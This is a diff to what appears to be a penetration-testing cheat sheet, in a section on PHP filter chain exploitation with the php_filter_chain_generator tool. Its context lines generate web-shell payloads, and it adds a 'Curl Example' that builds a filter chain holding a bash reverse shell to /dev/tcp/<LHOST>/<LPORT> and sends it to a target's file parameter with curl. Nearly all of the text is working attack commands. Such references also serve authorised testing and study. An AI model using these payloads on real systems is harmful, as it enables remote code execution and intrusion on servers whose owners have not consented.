@@ -3564,6 +3564,8 @@ foreach ($functions_to_test as $func) {
 
 > https://github.com/synacktiv/php_filter_chain_generator
 
+#### Common Payloads
+
 ```c
 $ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 $ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
@@ -3584,6 +3586,16 @@ OR
 $ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 [+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
+```
+
+#### Curl Example
+
+```c
+$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > payload.txt
+```
+
+```c
+$ curl "http://<RHOST>/index.php?file=$(cat payload.txt)"
 ```
 
 ### PHP Deserialization (Web Server Poisoning)
